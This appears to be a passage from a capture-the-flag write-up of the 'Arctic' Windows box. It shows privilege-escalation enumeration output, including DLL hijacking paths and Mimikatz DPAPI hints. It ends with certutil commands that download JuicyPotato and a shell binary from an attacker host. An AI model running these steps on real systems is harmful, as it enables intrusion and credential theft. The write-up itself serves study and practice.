 [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services

 [+] UNQUOTED SERVICE PATHS
   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Program.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'
   [i] The permissions are also checked and filtered using icacls
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
clr_optimization_v2.0.50727_32 
 C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe 
C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe NT SERVICE\TrustedInstaller:(F)

clr_optimization_v2.0.50727_64 
 C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe 
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe NT SERVICE\TrustedInstaller:(F)

PerfHost 
 C:\Windows\SysWow64\perfhost.exe 
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)

TrustedInstaller 
 C:\Windows\servicing\TrustedInstaller.exe 
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)


[*] DLL HIJACKING in PATHenv variable
   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations
   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking
C:\ColdFusion8\runtime\..\lib ARCTIC\tolis:(I)(OI)(CI)(F)
 
C:\ColdFusion8\runtime\..\jintegra\bin ARCTIC\tolis:(I)(OI)(CI)(F)
 
C:\ColdFusion8\runtime\..\jintegra\bin\international ARCTIC\tolis:(I)(OI)(CI)(F)
 
C:\ColdFusion8\verity\k2\_nti40\bin ARCTIC\tolis:(I)(OI)(CI)(F)
 
C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)
 
C:\Windows NT SERVICE\TrustedInstaller:(F)
 
C:\Windows\System32\Wbem NT SERVICE\TrustedInstaller:(F)
 

[*] CREDENTIALS

 [+] WINDOWS VAULT
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-vault

Currently stored credentials:

* NONE *

 [+] DPAPI MASTER KEYS
   [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi


    Directory: C:\Users\tolis\AppData\Roaming\Microsoft\Protect


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d---s         22/3/2017   9:04 ��            S-1-5-21-2913191377-1678605233-910
                                             955532-1000                       




 [+] DPAPI MASTER KEYS

   [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt
   [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi

Looking inside C:\Users\tolis\AppData\Roaming\Microsoft\Credentials\


Looking inside C:\Users\tolis\AppData\Local\Microsoft\Credentials\


 [+] Unattended files

 [+] SAM and SYSTEM backups

 [+] McAffee SiteList.xml
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 [+] GPP Password

 [+] Cloud Credentials

 [+] AppCmd
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd.exe

 [+] Files in registry that may contain credentials
   [i] Searching specific files that may contains credentials.
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
Looking inside HKCU\Software\ORL\WinVNC3\Password
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP
Looking inside HKCU\Software\TightVNC\Server
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions
Looking inside HKCU\Software\OpenSSH\Agent\Keys


C:\ColdFusion8\lib\thawte_premium_server_ca.cer
C:\Windows\Panther\setupinfo
C:\Windows\winsxs\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.1.7600.16385_none_f6ffffe15d1114b3\ntds.dit
C:\Windows\winsxs\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7600.16385_none_6cde646bce835df3\appcmd.exe
C:\Windows\winsxs\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.1.7600.16385_en-us_df5e63b27c378d72\certnew.cer
C:\Windows\winsxs\amd64_microsoft-windows-wsrm-service_31bf3856ad364e35_6.1.7600.16385_none_6fcf7854f8e05150\wsrmsign.cer
C:\Windows\winsxs\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7600.16385_none_77330ebe02e41fee\appcmd.exe

---
Scan complete.

```

```
certutil -UrlCache -f http://10.10.16.9:8081/JuicyPotato.exe jp.exe

certutil -UrlCache -f http://10.10.16.9:8081/shell.exe s.exe
```


***

## Resources

* [Adobe ColdFusion 8 - Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/50057)

***
